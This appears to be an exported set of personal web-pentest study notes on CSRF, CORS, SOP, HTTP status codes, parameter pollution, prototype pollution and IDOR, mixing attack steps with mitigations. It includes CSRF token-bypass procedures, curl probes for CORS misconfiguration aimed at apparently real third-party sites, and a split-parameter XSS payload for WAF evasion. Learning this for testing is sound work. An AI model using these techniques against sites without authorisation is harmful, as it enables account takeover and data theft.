[**CSRF**](onenote:https://d.docs.live.net/55ae89de0fa78438/Documents/Technical_Notes/Web%20App%20Bugs.one#CSRF&section-id={41F5CE7E-0477-4DC0-8D60-8E5FEA1AE31F}&page-id={EEEDFFD7-C412-49F0-8B77-EC25E75119F3}&end) **(**[**Web view**](https://onedrive.live.com/view.aspx?resid=55AE89DE0FA78438%216150&id=documents&wd=target%28Web%20App%20Bugs.one%7C41F5CE7E-0477-4DC0-8D60-8E5FEA1AE31F%2FCSRF%7CEEEDFFD7-C412-49F0-8B77-EC25E75119F3%2F%29)**)**

It was observed that web application is vulnerable to Cross Site Request Forgery (CSRF). This will allow an attacker to force a user to perform unwilling actions within the application (such as changing the email id, password and creating new accounts) on behalf of the attacker.

To successfully exploit this vulnerability, victim must click the crafted malicious link while logged into the application. The victim browser will then issue a request to the vulnerable web application. The vulnerable web application assumes that these forged requests are the genuine actions performed by the real user and the application processes those requests.

A malicious user can get sensitive application functionality executed by a logged in application user without his knowledge.

**It is recommended** to implement one-time random tokens that should be sent to on each request to the server and these tokens are validated at the server end and then process the request. If the tokens found to be invalid the request needs to be discarded.

**Exploitation:**

1.  CSRF forces authenticated users to execute unwanted actions on a web application.
    1.  Attack targets state-changing requests, not data theft, as attackers can't see responses to forged requests.
    2.  Trick the user such as Social engineering aids attackers in tricking users into executing malicious actions.
    3.  Successful CSRF attacks can lead to normal users performing actions like fund transfers or email changes.
    4.  Administrative account compromise is possible, potentially compromising the entire web application.

\#\#\#\#\#\# CSRF Token is Not Expire After Logout

1.  post login 1st account csrf toke : 3:125423245432:fb30489tugnrvkw45uthjgfn0394954302349v0vjkdksbgjit490tjfmdfldfgfrr5tgf
    1.  now login into your second account (goto profile account setting and change profile details something have to some modification) before
    2.  paste your 1st account csrf token and then forward request if profile information successfully changed or updated means CSRF Token is Not Expire After Logout

\#\#\#\#\#\#\#\#\# **Weak Token IMPLEMENTED**

post login into an account and change account settings before capture request from burp suite and generate csrf poc.

In that for example

1.  CSRF Token: 2FW2ghjbmnkoowe98YIHJBNMDKWEasfdfn39xd
    1.  replace with 11111111111111111111111111111111111111
    2.  and generate csrf poc and open it after submit request. if request successfully submit and change account information means it is vulnerable

2\. **Weak Token IMPLEMENTED** -- remove csrf token in page and submit request if account successfully updated means vulnerable

\#\#\#\#\#\#\# CSRF to account takeover

csrfattacker@mailinator.com/(attacker) –Firefox

csrfvictim@malinator.com(victim) – chrome

if changing email id,account id, and other information such as id first capture login request from burp and generate csrf poc in that change email id,id settings(another user id's) and now open in browser if it showing another user information means account takeover successfully.

[https://github.com/qazbnm456/awesome-web-security/blob/master/README.md\#csrf---cross-site-request-forgery](https://github.com/qazbnm456/awesome-web-security/blob/master/README.md#csrf---cross-site-request-forgery)

Common CSRF protection measures:

1.  CSRF-token
    1.  Cookie double submission (verification of cookie content)
    2.  Content-Type verification Referrer verification (source of verification request)
    3.  Password confirmation
    4.  SameSite cookies (currently only Chrome and Opera use this attribute)
    5.  SameSite=Strict:

**Double Submit Cookie**

While all the techniques referenced here do not require any user interaction, sometimes it’s easier or more appropriate to involve the user in the transaction to prevent unauthorized operations (forged via CSRF or otherwise). The following are some examples of techniques that can act as strong CSRF defense when implemented correctly.

1.  Re-Authentication (password or stronger)
    1.  One-time Token
    2.  CAPTCHA
    3.  Make sure your anti-virus software is up to date. Many malicious scripts can be blocked and quarantined by this software.
    4.  Do not open any emails, browse to other sites or perform any other social network communication while authenticated to your banking site or any site that performs financial transactions. This will prevent any malicious scripts from being executed while being authenticated to a financial site.

[**Secret token validation**](https://www.ibm.com/support/knowledgecenter/SSPREK_9.0.0/com.ibm.isam.doc/wrp_config/concept/con_conf_secret_token.html?view=kc)

You can configure WebSEAL to require that certain management operation requests include a secret token. WebSEAL uses the secret token in the received request to validate its authenticity.

[**Referrer validation**](https://www.ibm.com/support/knowledgecenter/SSPREK_9.0.0/com.ibm.isam.doc/wrp_config/concept/con_conf_allowed_referers.html?view=kc)

To help mitigate CSRF attacks, you can configure WebSEAL to validate the **referrer** header in incoming HTTP requests. WebSEAL compares this **referrer** header with a list of configured **allowed-referrers** to determine whether the request is valid.

[**Reject unsolicited authentication requests**](https://www.ibm.com/support/knowledgecenter/SSPREK_9.0.0/com.ibm.isam.doc/wrp_config/concept/con_conf_unsolic_logins.html?view=kc)

For extra mitigation against cross-site request forgery (CSRF), you can configure WebSEAL to reject any unsolicited login requests. This configuration ensures that WebSEAL does not process login requests without first issuing a login form.

=========

**A CSRF attack is sometimes called a one-click attack or session riding.**

Generally, CSRF happens when a browser automatically adds headers (i.e.: Session ID within a Cookie), and then made the session authenticated. Bearer tokens, or other HTTP header-based tokens that need to be added manually, would prevent you from CSRF.

Of course, but sort of off-topic, if you have a XSS vulnerability, an attacker could still access these tokens, but then it doesn't become a CSRF bug.

**Real Time example: So what is the impact of CSRF**

Now let's replace good.com above with facebook.com. And let's assume that when a user, logged into facebook.com, posts a comment on his wall, there is an HTTP GET request that gets sent, of the form say,

https: //facebook.com/postComment?userId=Abhinav_123&comment=HiIAmAbhinav.

Now let's assume that the user, while he is still logged in to facebook.com, visits a page on bad.com. Now bad.com belongs to an attacker where he has coded the following on bad.com:

\<img src="https: //facebook.com/postComment?userId=Abhinav_123&comment=I_AM_AN_IDIOT\>

Now as soon as the user's browser loads the contents of this page on bad.com, a request also gets sent to facebook.com as :

https: //facebook.com/postComment?userId=Abhinav_123&comment=I_AM_AN_IDIOT

because the browser tries to render the img tag. To do so it needs to fetch the resource specified in src and hence it sends the above HTTP GET request. So essentially the attacker could actually submit a request to facebook.com on behalf of the user without him actually knowing this.

==========

**But setting this random string in a cookie again has a HUGE flaw**

1.  Cookies are automatically sent with every client request to the server, including anti-CSRF tokens set in cookies.
    1.  Attackers don't need to know the anti-CSRF token because it's automatically included with requests when the user visits malicious sites.
    2.  This mechanism allows attackers to carry out actions like posting comments without knowing the token it will automatically accompany the request.

**So what is the solution then ?**

Instead of putting the anti-CSRF token in the cookie, the server (facebook.com) needs to put it as a **hidden parameter in a form** and make when the user requests for posting a comment this form (holding the anti-CSRF token) should also be posted.

Now the attacker has no way of performing this sensitive action on behalf of the user (unless he somehow finds out the random anti-CSRF token itself)

**Now coming to the problem of login CSRF and double submit cookie**

1.  Websites often use anti-CSRF tokens to defend against attacks, but they may forgot on protecting login forms.
    1.  Despite login forms being vulnerable to CSRF, attackers can't successfully log in as they lack the genuine user's credentials.
    2.  The attacker's domain can trick users into providing their credentials, so framing a successful login request is impossible.
1.  **So what is the attack opportunity for the attacker here ?**

The attacker can create his own account with facebook.com. He now has a valid set of credentials for himself. Now he frames the login request to facebook.com, with his login credentials, and on his domain (bad.com). Now when the user visits the page, bad.com, the user is logged into my account. I as an attacked can later see all the activities performed by the user on the account possibly disclosing sensitive info as well (like say friend requests sent if the user chooses to send new friend requests, messages sent to someone, again if the user does so after logging into my account.

All of these possibilities depend on how convinced the user is that he has logged into this own account, which again the attacker can take care of by making his own facebook page look as close to the victim's as possible to con him into believing that it is his account)

1.  The attacker creates their own login account on same like Facebook, obtaining valid credentials.
    1.  They then craft a login request to Facebook using their credentials, hosted on their domain (bad.com).
    2.  When a user visits bad.com, they unwittingly log into the attacker's account.
    3.  The attacker can monitor and potentially access sensitive information, like friend requests or messages sent by the user.
    4.  Deception tactics, such as mimicking the victim's Facebook page, can convince users they've logged into their own account, increasing the likelihood of successful attacks.

**So now what is the mitigation technique against this?**

It is a double submit cookie that we need now here.

==========================================

**CORS (Cross Origin Resource Sharing): -**

\---------------------------------------------------

**What Is CORS?**

For security reasons, SOP is implemented in all latest browsers, and because of that, **a website from one origin cannot access resources from a foreign origin, and to make that possible, CORS comes into the picture**. In short, CORS is standard of sharing cross-origin resources.

This allows restricted resources on a web page to be requested from another domain outside the domain from which the first resource was served.

1.  The client and server exchange a set of headers to specify behaviors regarding cross-domain requests.

![A close-up of a list Description automatically generated](media/e1c8a04f6dc10bfabf66ee1442caad4f.png)

**Conclusion**

CORS (**Cross-Origin Resource Sharing**) is the standard way of sharing resources from one origin to another. As SOP (**Same-Origin Policy**) is for security purpose, which restricts sharing of resources from origin to another, CORS provides us with a standard way to access it with proper implementation, as shown in the above examples

**Examples of Access Control Scenarios**

**Simple Request**

1.  The simple request is that the request that doesn't trigger a CORS preflight.
    1.  The only allowed HTTP methods are: **GET, HEAD, POST**
    2.  The only allowed values for the 'Content-Type' header are:   
        1\. application/x-www-form-URL encoded  
        2\. multipart/form-data  
        3\. text/plain

For example, suppose the web content on the domain [**http://a.com**](http://a.com) wishes to invoke content on the domain [**http://b.com**](http://b.com)**.** The code of this sort might be used within

JavaScript deployed on **http//a.com**:

var invocation = new XMLHttpRequest();

var url = '<http://b.com/resources/public-data/>';

function callOtherDomain() {

if(invocation) {

invocation.open('GET', url, true);

invocation.onreadystatechange = handler;

invocation.send();

}

}

Let us look at what the browser will send to the server in this case, and let's see how the server responds:

1\. The request from **"**[**http://a.com**](http://a.com)**"** is sent to the other server, **"**[**http://b.com,**](http://b.com,)**"** with the following CORS-related headers:

GET /resources/public-data/ HTTP/1.1

Host: b.com

Referer: <http://a.com/examples/access-control/simpleXSInvocation.html>

Origin: <http://a.com>

2\. The server **"**[**http://b.com**](http://b.com)**"** responds with the following CORS-related headers.

HTTP/1.1 200 OK

Access-Control-Allow-Origin: \*

In this case, the server responds with an **Access-Control-Allow-Origin: \*** , which means that the resource can be accessed from **any** domain in a cross-site manner.

1.  **Preflighted Request:** Unlike **"simple requests"** (discussed above), **"preflighted requests"** send an HTTP request by the **OPTIONS** method to the resource on the other domain, in order to determine whether the actual request is safe to send.

The only allowed HTTP methods are: **PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH.**

The only allowed values for the 'Content-Type' header **other than the below values are**:

1.  application/x-www-form-urlencoded
    1.  multipart/form-data
    2.  text/plain

Host: hackerseera.com

Origin: <http://bing.com> if not working set set pragma then send request to server

set Pragma: no-cache

1.  Host: hackerseera.com
    1.  Origin: <http://bing.com>
    2.  set Pragma: no-cache
    3.  Referrer: <https://bing.com/>

see the response:

in Response: Access-Control-Allow-Origin:http://bing.com site is allowing bing.com website it is vulnerable and we can add null also

2nd Method Origin is null value

1.  Host: hackerseera.com
    1.  Origin: null

\#\#\# Exploitation of Insecure CORS: 3rd conditions

First method if you found these in response

1.  ? POORLY IMPLEMENTED, BEST CASE FOR ATTACK:
    1.  Access-Control-Allow-Origin: <https://anysite.com>
    2.  Access-Control-Allow-Credentials: true

Second method

1.  ? POORLY IMPLEMENTED, EXPLOITABLE:
    1.  Access-Control-Allow-Origin: null
    2.  Access-Control-Allow-Credentials: true

Exploitation Process

Another way to check Insecure cors using curl command

CORS Vulnerability

1.  \#curl <http://any.com> -H “Origin: <http://www.bing.com>” -I
    1.  \#Curl <https://blog.qagoma.qld.gov.au/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.qagoma.qld.gov.au%2Faleks-danko-what-time-is-it%2F> H "Origin: <https://bing.com>" -I
    2.  \#Curl <https://www.invisionapp.com/blog/wp-json/> H “Origin: <http://bing.com>” - I

In response it is showing like this means it is vulnerable

1.  Access-Control-Allow-Origin: <http://www.bing.com>
    1.  Access-Control-Allow-Origin: \* or
    2.  Access-Control-Allow-Origin: true

or check the reference like or any 3rd party where it is interacting only links copy that url again run the curl command until the like showing above.

html code required to do exploitation (Word Document poc)

change html code in

xhttp.open("GET", "URL paste here- vulnerable url", true);

the open in firebox browser try to exploit it.

sometimes open with incognito mode. after exploit check for any sensitive information.

if they are mentioned

Access-Control-Allow-Origin: \*

Access-Control-Allow-Credentials: true

[SSRF Bypassing Techniques](onenote:https://d.docs.live.net/55ae89de0fa78438/Documents/Technical_Notes/Web%20App%20Bugs.one#SSRF%20Bypassing%20Techniques&section-id={41F5CE7E-0477-4DC0-8D60-8E5FEA1AE31F}&page-id={7EA18A71-7EBF-4AE8-936C-12A09C7DC935}&end) ([Web view](https://onedrive.live.com/view.aspx?resid=55AE89DE0FA78438%216150&id=documents&wd=target%28Web%20App%20Bugs.one%7C41F5CE7E-0477-4DC0-8D60-8E5FEA1AE31F%2FSSRF%20Bypassing%20Techniques%7C7EA18A71-7EBF-4AE8-936C-12A09C7DC935%2F%29))

**What Is SOP (Same-Origin Policy)?**

SOP is a security mechanism implemented in almost all of the modern browsers. It **does not allow documents or scripts loaded from one origin to access resources from other origins**. Now, what is the origin? The origin is not only domain. — The origin could be the combination of the Host name, Port number, and URI (Uniform Resource Identifier) Scheme.

**Why Is SOP Important?**

For any HTTP request to a particular domain, browsers automatically attach any cookies bounded to that domain.

![A diagram of a computer network Description automatically generated](media/c945987a4b245f2a1a94ecac34d71661.png)

It doesn't matter if a request originates from **"your-bank.com"** or **"malicous.com**." As long as the request goes to your-bank.com, the cookies stored for your-bank.com would be used. As you can see, without the Same-Origin Policy, a Cross-Site Request Forgery (CSRF) attack can be relatively simple, assuming that authentication is based solely on a session cookie. That’s one of the reasons the SOP was introduced.

In summary, the main difference between SOP and CORS is that SOP is a fundamental security feature of web browsers that restricts web pages from making requests to a different domain than the one that served the web page, while CORS is a mechanism that relaxes this restriction to allow controlled access to cross-origin resources when necessary.

**================**

1.  **Finding exploit codes in internet stuff. What is the site you will check?**

[http://www.exploit-db.com](http://www.exploit-db.com/)

[http://1337day.com](http://1337day.com/)

[http://www.securiteam.com](http://www.securiteam.com/)

[http://www.securityfocus.com](http://www.securityfocus.com/)

[http://www.exploitsearch.net](http://www.exploitsearch.net/)

<http://metasploit.com/modules/>

[http://securityreason.com](http://securityreason.com/)

<http://seclists.org/fulldisclosure/>

[http://www.google.com](http://www.google.com/)

1.  **Input Validation:** validate inputs against a whitelist of acceptable values and reject all non-conforming values. Do not accept file and path separator characters if you do not have to.
    1.  **Indirect References  
        **Instead of working with file names or paths, an alternative design passes (cryptographically strong) random codes to designate files. These codes are then mapped to the corresponding file on the server. This effectively limits the selection to the domain presented to the user.
    2.  **Least Privilege  
        **The account used by the application should enjoy the minimal privileges necessary with respect to the file system. Ideally, this should be limited to files within the legitimate purview of the application and current user.
    3.  **What is block list and white list?**

**Blacklist**: In computing, a **blacklist** is a basic access control mechanism that allows everyone access, except for the members of the black list (i.e. list of denied accesses). The opposite is a **whitelist**, which means allow nobody, except members of the white list.

1.  **what are the tools you used for application pt**

\--burp-suite Nikto nmap curl wget nc telnet vega, Nessus, accunetix, dot slash, wpscan, Joomla scan, commix, sqlmap

1.  **What are the status codes below?**

**What is 500 error code in HTTP?**

500 Internal Server Error. The 500 status code, or Internal Server Error, means that server cannot process the request for an unknown reason. Sometimes this code will appear when more specific **5xx** errors are more appropriate.

**What is a 304 status code?**

Not Modified. If the client has performed a conditional GET request and access is allowed, but the document has not been modified, the server SHOULD respond with this status code. The 304 response MUST NOT contain a message-body, and thus is always terminated by the first empty line after the header fields.

**Why does Error 400 occur?**

The HTTP **400 error occurs** if the HTTP header is too long. ... Because this involves communication between the browser and the webserver, and **400 errors are** usually caused by problems with the client, the browser is probably responsible for the **error**.

**Now that you have a high-level understanding of HTTP status codes, we will look at the commonly encountered errors.**

1.  400 Bad Request. ...
    1.  401 Unauthorized. ...
    2.  403 Forbidden. ...
    3.  404 Not Found. ...
    4.  500 Internal Server Error. ...
    5.  502 Bad Gateway. ...
    6.  503 Service Unavailable. ...
    7.  504 Gateway Timeout.

| **S.N.** | **Code and Description**                                                                     |
|----------|----------------------------------------------------------------------------------------------|
| 1        | **1xx: Informational** It means the request has been received and the process is continuing. |
| 2        | **2xx: Success** It means the action was successfully received, understood, and accepted.    |
| 3        | **3xx: Redirection** It means further action must be taken in order to complete the request. |
| 4        | **4xx: Client Error** It means the request contains incorrect syntax or cannot be fulfilled. |
| 5        | **5xx: Server Error** It means the server failed to fulfill an apparently valid request.     |

**1xx: Information**

| **Message**             | **Description**                                                                                                                                   |
|-------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------|
| 100 Continue            | Only a part of the request has been received by the server, but as long as it has not been rejected, the client should continue with the request. |
| 101 Switching Protocols | The server switches protocol.                                                                                                                     |

**2xx: Successful**

| **Message**                       | **Description**                                                                                                                                                                                                    |
|-----------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 200 OK                            | The request is OK.                                                                                                                                                                                                 |
| 201 Created                       | The request is complete, and a new resource is created.                                                                                                                                                            |
| 202 Accepted                      | The request is accepted for processing, but the processing is not complete.                                                                                                                                        |
| 203 Non-authoritative Information | The information in the entity header is from a local or third-party copy, not from the original server.                                                                                                            |
| 204 No Content                    | A status code and a header are given in the response, but there is no entity-body in the reply.                                                                                                                    |
| 205 Reset Content                 | The browser should clear the form used for this transaction for additional input.                                                                                                                                  |
| 206 Partial Content               | The server is returning partial data of the size requested. Used in response to a request specifying a *Range* header. The server must specify the range included in the response with the *Content-Range header*. |

**3xx: Redirection**

| **Message**            | **Description**                                                                                                                              |
|------------------------|----------------------------------------------------------------------------------------------------------------------------------------------|
| 300 Multiple Choices   | A link list. The user can select a link and go to that location. Maximum five addresses .                                                    |
| 301 Moved Permanently  | The requested page has moved to a new url .                                                                                                  |
| 302 Found              | The requested page has moved temporarily to a new url .                                                                                      |
| 303 See Other          | The requested page can be found under a different url .                                                                                      |
| 304 Not Modified       | This is the response code to an *If-Modified-Since* or *If-None-Match header*, where the URL has not been modified since the specified date. |
| 305 Use Proxy          | The requested URL must be accessed through the proxy mentioned in the *Location* header.                                                     |
| 306 *Unused*           | This code was used in a previous version. It is no longer used, but the code is reserved.                                                    |
| 307 Temporary Redirect | The requested page has moved temporarily to a new url.                                                                                       |

**4xx: Client Error**

| **Message**                         | **Description**                                                                                                                                                  |
|-------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 400 Bad Request                     | The server did not understand the request.                                                                                                                       |
| 401 Unauthorized                    | The requested page needs a username and a password.                                                                                                              |
| 402 Payment Required                | *You cannot use this code yet*.                                                                                                                                  |
| 403 Forbidden                       | Access is forbidden to the requested page.                                                                                                                       |
| 404 Not Found                       | The server cannot find the requested page.                                                                                                                       |
| 405 Method Not Allowed              | The method specified in the request is not allowed.                                                                                                              |
| 406 Not Acceptable                  | The server can only generate a response that is not accepted by the client.                                                                                      |
| 407 Proxy Authentication Required   | You must authenticate with a proxy server before this request can be served.                                                                                     |
| 408 Request Timeout                 | The request took longer than the server was prepared to wait.                                                                                                    |
| 409 Conflict                        | The request could not be completed because of a conflict.                                                                                                        |
| 410 Gone                            | The requested page is no longer available .                                                                                                                      |
| 411 Length Required                 | The "Content-Length" is not defined. The server will not accept the request without it .                                                                         |
| 412 Precondition Failed             | The pre condition given in the request evaluated to false by the server.                                                                                         |
| 413 Request Entity Too Large        | The server will not accept the request, because the request entity is too large.                                                                                 |
| 414 Request-url Too Long            | The server will not accept the request, because the url is too long. Occurs when you convert a "post" request to a "get" request with a long query information . |
| 415 Unsupported Media Type          | The server will not accept the request, because the mediatype is not supported .                                                                                 |
| 416 Requested Range Not Satisfiable | The requested byte range is not available and is out of bounds.                                                                                                  |
| 417 Expectation Failed              | The expectation given in an Expect request-header field could not be met by this server.                                                                         |

**5xx: Server Error**

| **Message**                    | **Description**                                                                                  |
|--------------------------------|--------------------------------------------------------------------------------------------------|
| 500 Internal Server Error      | The request was not completed. The server met an unexpected condition.                           |
| 501 Not Implemented            | The request was not completed. The server did not support the functionality required.            |
| 502 Bad Gateway                | The request was not completed. The server received an invalid response from the upstream server. |
| 503 Service Unavailable        | The request was not completed. The server is temporarily overloading or down.                    |
| 504 Gateway Timeout            | The gateway has timed out.                                                                       |
| 505 HTTP Version Not Supported | The server does not support the "http protocol" version.                                         |

1.  **what is HTTP parameter pollution? (Shruthi identified this vulnerability in Diageo environment, added one new extra parameter in get(url) request and it is reflected in browser so I will take vulnerable to reflected cross site scripting attack)**
1.  attack can be realized is because the input is not sanitized properly, as a result of HTTP allow the submission of the same parameter more than once
    1.  the manipulation of the value of each parameter depends on how each web technology is parsing these parameters So, what happens if the same parameter is provided more than one time?

Some web technologies parse the first or the last occurrence of the parameter, some concatenate all the inputs and others will create an array of parameters. Below is a table showing how each web technology is parsing different values of the same parameters at the server-side. Understanding how different web technologies parse parameter values is crucial for defending against such attacks.

![A table with text on it Description automatically generated](media/8374aa60db8c5ee9dff6079ae18623a8.jpeg)

The following examples show how the web technology of a web application is triggering or parsing same parameters in one query. The first example on how parameters are triggered can be shown below using Google search engine. In Google you can have the following query: <http://www.google.com/search?q=web&q=application&q=security>

![A search engine window with words Description automatically generated with medium confidence](media/ceb892ec4f03e1798bb7b578c685cf64.jpeg)

As shown in the above screenshot, the same parameter **‘q’ i**s being used three times. In this case, Google concatenates the three values with a space in-between, thus the end result will be ‘web application security’.

A second example is with the search engine Yahoo!. The following query has been used:

<http://search.yahoo.com/search;_ylt=Ajxtx6DKiSkS1pjEfg6zSMWbvZx4?p=web&p=application&p=security>

Having the same **three parameters** as with the previous example, it is shown that Yahoo! is only parsing the last parameter, thus the end result will be ‘security’.

**what is Prototype Pollution attack in summary and how to do it one example**  <https://www.youtube.com/shorts/HzedAeTppHI>

Prototype Pollution is a vulnerability that occurs in JavaScript-based applications where an attacker can modify the prototype of an object or create new properties on the prototype chain. This can lead to the execution of arbitrary code, data breaches, and system compromise. The attack is often carried out by exploiting unsensitized user input or third-party libraries that can manipulate the prototype chain.

One example of a Prototype Pollution attack is when an attacker submits a form with a malicious payload that contains a prototype pollution payload. This payload can modify the prototype of an existing object, allowing the attacker to execute arbitrary code or access sensitive information. For instance, an attacker could inject a prototype pollution payload that modifies the "Array" object's prototype, allowing them to execute arbitrary code on the server-side that manipulates or extracts sensitive data from the application's database.

![A screenshot of a computer Description automatically generated](media/3653e7ebdb86c90478c62618c63932cc.png)

To prevent this attack, developers should always sanitize user input, validate third-party dependencies, and regularly update libraries to avoid known vulnerabilities. Additionally, using a Content Security Policy (CSP) can help protect against cross-site scripting (XSS) attacks that can be used to exploit Prototype Pollution vulnerabilities.

**Client-side and Server-Side**

1.  HTTP Parameter Pollution can lead to client-side or server-side attacks, depending on how technologies parse parameters.
    1.  Different parsing methods enable various attacks, allowing manipulation of parameters for hacking activities either at the front-end (client) or the backend (server) of the web application..

**Client-side HTTP Parameter Pollution vulnerability**

The HTTP Parameter Pollution (HPP) Client-side attack has to do with the client or user environment, meaning that the user’s actions (i.e. access a link in a browser) are affected and will trigger a malicious or unintended action without the user’s knowledge. HPP Client-side attacks can be reflected HPP (such as an injection of additional parameters to URL links and/or other src attributes), stored HPP (which can be functional on all tags with data, src, and href attributes) and action forms with POST method. Another HPP client-side attack is the DOM-based attack which has to do mostly with parsing unexpected parameters and the realization of client-side HPP using JavaScript.

Obviously, the ability or capacity of the injection depends on the attributes of the link and its functionalities. Nevertheless, the main aim is to generate HPP attacks on the client side.

An example of a typical HPP client-side attack includes a website that is vulnerable to HPP and a group of victims that will interact with the vulnerable website. An attacker, after identifying a vulnerable website, will create a vulnerable link with its HTTP parameters polluted and will send this link or make it publicly available through emails or social networks for naive and unsuspecting victims to click on. After the victims have clicked on it, the intended malicious behavior will be performed, affecting the users and the web application (application providers).

**Summary:**

1.  HTTP Parameter Pollution (HPP) Client-side attacks happen in the user's environment, without their knowledge.
    1.  They involve reflected HPP (adding parameters to URL links), stored HPP (functional on various tags), and action forms with POST method.
    2.  DOM-based attacks, using JavaScript, are another form of HPP client-side attack.
    3.  Attackers exploit vulnerable websites by creating polluted links, enticing unsuspecting users to click.
    4.  After clicking, users inadvertently trigger malicious actions, affecting both users and the web application.

=======

The following scenario is a webmail service website from where a user can view and delete his/her emails. The URL of the webmail website is:

<http://host/viewemail.jsp?client_id=79643215>

The link to view an email is

\<a href=”viewemail.jsp?client_id=79643215&action=view”\> View \</a\>

The link to delete an email is:

\<a href=”viewemail.jsp?client_id=79643215&action=delete”\> Delete \</a\>

When the user clicks on either of the above links, the appropriate action will be performed. The two links are built from the URL. The ID will be requested and will be embedded/added in the href link together with the according action. Thus:

ID = Request.getParameter(“client_id”)

href_link = “viewemail.jsp?client_id=” + ID + ”&action=abc”

This web application, and more precisely the client_id, is vulnerable to HPP. As seen below, an attacker creates a URL and injects another parameter ‘action’ preceded by an encoded query string delimiter (e.g. %26) after the client_id parameter. This parameter holds the value ‘delete’:

<http://host/viewemailn.jsp?client_id=79643215%26action%3Ddelete>

After the creation of the malicious link, the page now contains two links which are injected with an extra action parameter. Thus:

**\<a href=viewemail.jsp?client_id=79643215&action=delete&action=view \> View \</a\>**

**\<a href=viewemail.jsp?client_id=79643215&action=delete&action=delete \> Delete \</a\>**

=======

As shown in the table above, JSP will parse the two same parameters (action) and will return the first value. The JSP query Request.getParameter(“action”) will return ‘delete’ in both cases. Thus, the user will click either of the two links, View or Delete, but the action Delete will always be performed.

This is a simple example how an attacker can exploit an HTTP Parameter Pollution vulnerable website and cause malicious code to run or be executed without being detected.

**Server-side HTTP Parameter Pollution vulnerability**

In the HPP Server-side the back-end environment of the web application will be affected. The attacker using HPP attacks will try to exploit the logic of the vulnerable web application by sending a triggered, or polluted URL, for example to access the database of a web application.

HPP Server-side can be also used to bypass several web application firewalls (WAFs) rules. Some WAFs only validate a single parameter occurrence, such as the first or the last one. In a case where the web technology concatenates the value of multiple parameters which are the same, such as ASP.NET/IIS, then an attacker can split the malicious code into those occurrences thus bypassing the security mechanism or rules of the web application firewall.

1.  In HPP Server-side attacks, the backend environment of the web application is targeted.
    1.  Attackers exploit vulnerable web app logic by sending manipulated URLs, aiming to access sensitive data like the database.
    2.  HPP Server-side attacks can also bypass certain web application firewall (WAF) rules.
    3.  Some WAFs only validate a single parameter occurrence, allowing attackers to split malicious code across occurrences and evade firewall rules, particularly in technologies like ASP.NET/IIS.

| Aspect                    | Client-side HTTP Parameter Pollution                                            | Server-side HTTP Parameter Pollution                                             |
|---------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------------|
| Location of manipulation  | Within the user's browser environment, typically using client-side scripting    | Within the server's environment, affecting server processing and responses       |
| Example attack types      | Cross-site scripting (XSS), where malicious scripts execute in user's browser   | Injection attacks (e.g., SQL injection), improper access control                 |
| Impact                    | End-user security compromised, potential for data theft or unauthorized actions | Server security compromised, potential for data breaches or system compromise    |
| Prevention and mitigation | Input validation and sanitization, proper encoding of output to prevent XSS     | Server-side input validation, parameterized queries to prevent injection attacks |
| Target of the attack      | User's browser and local environment                                            | Web server and server-side processing mechanisms                                 |

Moreover, URL rewriting can occur using HPP. For instance, an attacker can inject an encoded query string in order to cause the URL to be rewritten. An example can be seen below:

Encoded string:

<http://host/xyz%26page%3dedit>

Rewritten URL:

<http://host/page.php?page=view&page=xyz&action=edit&id=0>

As mentioned before, the capability of the injection depends on the attributes of the link and its exposed functionalities.

HPP Server-side attacks can also be used for cross-channel pollution and to bypass CSRF tokens.

In order to better understand the server-side HPP attack, the following example will try to explain how this attack can bypass web application firewall rules or signature-based filters using concatenation of parameters with the same values. The following URL/request is send to the server:

<http://testaspnet.vulnweb.com/test/vuln.cgi?par1=val1&par2=val2>

The web server will parse the above query and will split it into pairs (name/value) in order to be manipulated or used by the web application. Thus, the web application will take par1 and par2 with values val1 and val2 respectively. If the web application is vulnerable to HPP attacks, an attacker could exploit it and submit a malicious payload. Take the following case:

<http://testaspnet.vulnweb.com/test/vuln.cgi?par1=val1&par1=val2>

You can see that there are two par1 parameters, each holding two different values. In this case how is the application going to trigger this? It depends on the web technology, as seen in the Web Technologies section above. Because of the different handling methods of parameters, hackers can control them in order to avoid security mechanisms and attack the web application.

In another example, where the web technology is ASP.NET/IIS, a hacker can send the following request to the server:

[http://testaspnet.vulnweb.com/test/vuln.cgi?par1=\<script&par1=prompt.”…”\>](http://testaspnet.vulnweb.com/test/vuln.cgi?par1=%3cscript&par1=prompt.”…”%3e) …

Since ASP.NET/IIS concatenates the values of the same parameters, the end result will be \<script prompt”…”\>. Consequently, an attacker can expand this into a complete cross-site scripting attack.

Generally, an attacker can use HPP vulnerabilities to:

1.  Supersede existing hardcoded HTTP parameters.
    1.  Alter or modify the intended/normal application behavior.
    2.  Access and potentially exploit variables that are not been controlled properly.
    3.  Bypass WAFs rules or input validation mechanisms.

**Countermeasures / Prevention:**

In order to prevent these kinds of vulnerabilities, an extensive and **proper input validation should be performed**. There are safe methods to conform to with each web technology/language. Moreover, awareness about the fact that clients/users can provide more than one parameter should be raised.

1.  **What is IDOR vulnerability?**
1.  IDOR, or Insecure Direct Object References, is a vulnerability in web apps where user input like IDs or object references isn't properly validated.
    1.  Attackers exploit this vulnerability by manipulating these values in HTTP parameters, headers, or cookies to access, alter, or delete others' data without permission or proper authorization.
    2.  This allows unauthorized access to sensitive data or actions within the application and is commonly referred to as IDOR

=========

**Blind IDOR**

In another case, you can find an IDOR vulnerability but you may couldn’t realize of that. For example, if you change the object’s information in app, you’ll get an email that includes the object’s information. So if you try to change another user’s information of object, you can’t access anything in HTTP response but you can access the information of object with an email. You can call it “Blind IDOR”. 🙂

**A blind IDOR is a specific type of Insecure Direct Object Reference vulnerability where the leaked information isn't directly revealed in the application's response. Instead, it's leaked through indirect channels like email notifications, SMS alerts, or downloaded files. This makes it more challenging to detect and exploit compared to regular IDORs.**

An insecure direct object reference vulnerability occurs when the following three conditions are met:

The application reveals a direct reference to an internal resource or operation.

The user is able to manipulate a URL or form parameter to modify the direct reference.

The application grants access to the internal object without checking if the user is authorized.

**======**

**Interesting cases for IDOR bugs**

**Manipulate the create requests**

1.  In some apps, IDs are created on the client-side and sent with requests to the server.
    1.  These IDs can be simple numbers like "-1" or "0", and they often correspond to existing objects' IDs.
    2.  Exploiting IDOR, attackers can delete or edit other users' objects by manipulating these ID values.
    3.  If you don't see parameters like "id", "user_id", "value", "pid", or "post_id" when creating objects, try adding them to test for vulnerabilities.
